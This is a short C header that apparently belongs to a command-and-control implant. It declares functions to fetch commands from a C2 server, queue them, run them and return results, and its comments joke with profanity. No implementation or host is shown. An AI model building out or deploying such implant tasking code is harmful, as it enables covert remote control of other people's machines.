#pragma once
#include "task_queue.h"
#include "result_queue.h"


typedef struct {
    TaskQueue *tq;
    ResultQueue *rq;
} PayloadContext;



/**
 * Fetches one new command from C2 and enqueues it
 * will returns 1 if a task was added, 0 if “sleep” payload, and -1 if it hates you
 */
int get_payload(TaskQueue *queue);


/**
 * Pop the next pending task (FIFO), run it, and push the result into the ResultQueue
 * Returns:
 *   1  -> a task was executed
 *   0  -> no pending tasks
 *  -1  -> you fucking mushroom
 */
int execute_payload(TaskQueue *q, ResultQueue *r);


/**
 * A wrapper runs the main job of payload stuff
 */
void payload_job(void *c);